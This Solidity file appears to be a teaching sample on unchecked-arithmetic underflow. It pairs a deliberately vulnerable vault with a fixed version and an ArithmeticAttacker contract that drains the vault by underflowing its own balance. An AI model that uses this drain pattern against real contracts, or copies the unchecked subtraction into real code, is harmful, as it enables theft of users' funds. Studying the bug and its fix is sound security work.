// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableUncheckedVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external virtual {
        unchecked {
            balances[msg.sender] -= amount;
        }

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");
    }
}

contract FixedCheckedVault is VulnerableUncheckedVault {

    function withdraw(uint256 amount) external override {
        require(balances[msg.sender] >= amount, "insufficient balance");
        balances[msg.sender] -= amount;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");
    }
}

contract ArithmeticAttacker {
    VulnerableUncheckedVault public immutable TARGET;

    constructor(address targetAddress) {
        TARGET = VulnerableUncheckedVault(targetAddress);
    }

    function attack() external payable {
        TARGET.deposit{value: msg.value}();

        while (address(TARGET).balance > 0) {
            uint256 amount = address(TARGET).balance >= 2 ether ? 2 ether : address(TARGET).balance;
            TARGET.withdraw(amount);
        }
    }

    receive() external payable {}
}
